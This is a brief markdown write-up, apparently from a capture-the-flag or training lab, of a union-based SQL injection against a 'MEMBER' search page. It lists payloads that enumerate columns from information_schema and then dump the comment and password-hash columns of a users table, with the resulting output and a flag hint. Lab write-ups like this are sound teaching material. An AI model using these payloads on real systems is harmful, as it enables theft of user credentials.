# SQL injection

## vulnerability
see [SQLi_for_image_Resources/README.md](SQLi_for_image/Resources/README.md)

## exploit
Home -> MEMBER

1. union based SQL injection<br/>
```
1 union select null, column_name from information_schema.columns--
```
->
```
ID: 1 union select  null, column_name from information_schema.columns-- 
First name: 
Surname : Commentaire
ID: 1 union select  null, column_name from information_schema.columns-- 
First name: 
Surname : countersign
```
***
```
1 union select Commentaire, countersign from users--
```
->
```
ID: 1 union select Commentaire, countersign from users-- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```
